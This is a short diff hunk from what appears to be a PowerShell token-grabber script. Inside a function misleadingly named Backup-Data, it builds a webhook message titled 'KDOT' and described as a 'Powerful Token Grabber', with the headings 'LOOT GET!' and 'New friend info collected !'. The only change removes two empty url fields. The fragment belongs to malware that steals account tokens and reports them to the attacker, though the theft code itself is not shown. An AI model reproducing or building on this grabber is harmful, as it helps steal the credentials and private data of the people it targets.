@@ -664,11 +664,9 @@ function Backup-Data {
         "title" = "KDOT"
         "description" = "Powerful Token Grabber"
         "color" = "3447003"
-        "url" = ""
         "embeds" = @(
             @{
                 "title" = "LOOT GET!"
-                "url" = ""
                 "description" = "New friend info collected !"
                 "color" = "3447003"
                 "footer" = @{
